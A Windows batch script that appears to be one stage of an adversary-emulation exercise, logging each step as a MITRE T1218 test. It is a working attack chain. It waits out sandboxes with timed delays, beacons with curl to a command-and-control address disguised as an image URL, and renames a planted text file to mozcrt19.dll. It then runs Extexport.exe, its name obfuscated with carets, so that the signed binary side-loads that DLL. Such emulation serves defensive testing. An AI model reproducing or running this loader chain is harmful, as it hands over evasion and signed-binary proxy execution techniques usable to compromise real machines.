@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names for PHR_ values
SET yktnwwf=%APPDATA%\8907\018895ac
SET fpakbq=Macula-Stage0-8907
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8907-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=winword.txt
SET fpldhe=8907

SET logfile=%APPDATA%\!yydue!\macula-simulations.log
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_started>> "!logfile!" 2>nul

REM Initial sandbox delay
timeout /t 15 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete>> "!logfile!" 2>nul

REM Mandatory C2 heartbeat (NO obfuscation on curl)
curl -k -s -o nul "!rdzgrnne!"
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_sent_to=!rdzgrnne!>> "!logfile!" 2>nul

ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: delay_after_heartbeat>> "!logfile!" 2>nul

REM Change to output directory
cd /d "!yktnwwf!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_to=!yktnwwf!>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: pre_rename_delay>> "!logfile!" 2>nul

REM Rename DLL
ren "!edjwtl!" mozcrt19.dll >nul 2>&1
SET rename_result=%ERRORLEVEL%
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_from=!edjwtl!_to=mozcrt19.dll_result=!rename_result!>> "!logfile!" 2>nul

REM Random delay
SET /A random_delay=%RANDOM% %% 15 + 10
timeout /t !random_delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_seconds=!random_delay!>> "!logfile!" 2>nul

REM Obfuscated Extexport.exe execution (T1218)
SET cmd1=E^x^t^e^x^p^o^r^t
SET cmd2=^.^e^x^e
%SystemRoot%\System32\!cmd1!!cmd2! . foo bar
SET ttp_result=%ERRORLEVEL%

IF !ttp_result! EQU 0 (
    SET result=1
    SET err_detail=
) ELSE (
    SET result=0
    SET err_detail=process_creation_failed
)

SET ttp_time=%DATE% %TIME%
SET ttp_time=!ttp_time:/=-!
SET ttp_time=!ttp_time:.=:!
echo [!ttp_time!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!result!:!err_detail!>> "!logfile!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: ttp_executed_result=!ttp_result!>> "!logfile!" 2>nul

ENDLOCAL